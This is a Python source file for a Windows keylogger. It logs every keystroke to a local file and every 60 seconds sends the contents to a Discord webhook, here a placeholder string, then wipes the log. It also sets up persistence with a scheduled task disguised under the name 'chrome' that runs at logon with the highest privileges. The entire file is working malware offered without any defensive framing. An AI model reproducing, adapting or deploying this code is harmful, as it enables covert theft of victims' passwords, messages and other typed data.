import os
import time
import requests
import shutil
import sys
from pynput import keyboard
import winshell
import subprocess

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
file = "keylog.txt"

def send_to_discord(ss):
    q = {
        "tt": ss
    }
    requests.post(discord, json=q)

def on_press(key):
    try:
        with open(file, "a") as lol:
            lol.write(f"{key.char}\n")
    except AttributeError:
        with open(file, "a") as lol:
            lol.write(f"{key}\n")

def create_scheduled_task():
    file_path = os.path.abspath(sys.argv[0])

    task_name = "chrome"
    cmd = f"schtasks /create /tn {task_name} /tr {file_path} /sc onlogon /rl highest"
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        pass

create_scheduled_task()

with keyboard.Listener(on_press=on_press) as listener:

    while True:
        time.sleep(60)

        if os.path.exists(file):
            with open(file, 'r') as f:
                ee = f.read()
            send_to_discord(ee)

            with open(file, "w") as lol:
                lol.write("")

listener.join()
